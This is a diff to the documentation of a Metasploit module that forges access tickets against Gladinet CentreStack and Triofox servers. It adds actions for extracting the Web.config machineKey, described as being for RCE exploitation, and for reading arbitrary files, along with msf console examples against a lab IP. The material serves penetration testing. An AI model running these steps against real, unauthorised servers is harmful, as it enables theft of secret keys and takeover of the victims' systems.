@@ -42,15 +42,39 @@ You are now ready to test the module.
 - [ ] `use auxiliary/gather/gladinet_storage_access_ticket_forge`
 - [ ] `set rhosts <ip-target>`
 - [ ] `set rport <port>` (default: 80)
-- [ ] `set filepath <file-to-read>` (default: `C:\Program Files (x86)\Gladinet Cloud Enterprise\root\Web.config`)
+- [ ] `set product <CentreStack|Triofox>` (default: CentreStack)
+- [ ] `set action <READ_FILE|EXTRACT_MACHINEKEY>` (default: EXTRACT_MACHINEKEY)
+- [ ] `set filepath <file-to-read>` (optional, auto-selected based on PRODUCT)
 - [ ] `run`
 - [ ] The module should forge an access ticket and read the specified file
 
+## Actions
+
+### EXTRACT_MACHINEKEY (default)
+
+Read the Web.config file and extract the machineKey for RCE exploitation.
+The Web.config path is automatically determined based on the PRODUCT option.
+
+### READ_FILE
+
+Read an arbitrary file from the target system.
+
 ## Options
+
+### PRODUCT
+
+Target product type. Either `CentreStack` or `Triofox`. Default: `CentreStack`
+
+This option affects:
+- The default Web.config path used for EXTRACT_MACHINEKEY action
+- The storage endpoint path (`/storage/filesvr.dn` for CentreStack, `/servlets/filesvr.dn` for Triofox)
 
 ### FILEPATH
 
 The file path to read on the target. Default: `C:\Program Files (x86)\Gladinet Cloud Enterprise\root\Web.config`
+
+For Triofox targets, set PRODUCT to `Triofox` and the module will automatically use
+`C:\Program Files (x86)\Triofox\root\Web.config` for the EXTRACT_MACHINEKEY action.
 
 ### SYSKEY
 
@@ -62,7 +86,7 @@ SysKey1 (16 bytes) in hex format. Default is the hardcoded key extracted from Gl
 
 ## Scenarios
 
-### Gladinet CentreStack Build 16.1.10296.56315 on Windows Server 2019 - Reading Web.config
+### Gladinet CentreStack Build 16.1.10296.56315 on Windows Server 2019 - Extracting machineKey
 
 ```msf
 msf6 > use auxiliary/gather/gladinet_storage_access_ticket_forge
@@ -72,8 +96,8 @@ msf6 auxiliary(gather/gladinet_storage_access_ticket_forge) > set rport 80
 rport => 80
 msf6 auxiliary(gather/gladinet_storage_access_ticket_forge) > set ssl false
 ssl => false
-msf6 auxiliary(gather/gladinet_storage_access_ticket_forge) > set filepath "C:\Program Files (x86)\Gladinet Cloud Enterprise\root\Web.config"
-filepath => C:\Program Files (x86)\Gladinet Cloud Enterprise\root\Web.config
+msf6 auxiliary(gather/gladinet_storage_access_ticket_forge) > set product CentreStack
+product => CentreStack
 msf6 auxiliary(gather/gladinet_storage_access_ticket_forge) > run
 [*] Running module against 192.168.1.21
 [*] Running automatic check ("set AutoCheck false" to disable)
@@ -268,6 +292,8 @@ set MACHINEKEY 5496832242CC3228E292EEFFCDA089149D789E0C4D7C1A5D02BC542F7C6279BE9
 ### Reading an arbitrary file
 
 ```msf
+msf6 auxiliary(gather/gladinet_storage_access_ticket_forge) > set action READ_FILE
+action => READ_FILE
 msf6 auxiliary(gather/gladinet_storage_access_ticket_forge) > set filepath "C:\Windows\System32\drivers\etc\hosts"
 filepath => C:\Windows\System32\drivers\etc\hosts
 msf6 auxiliary(gather/gladinet_storage_access_ticket_forge) > run
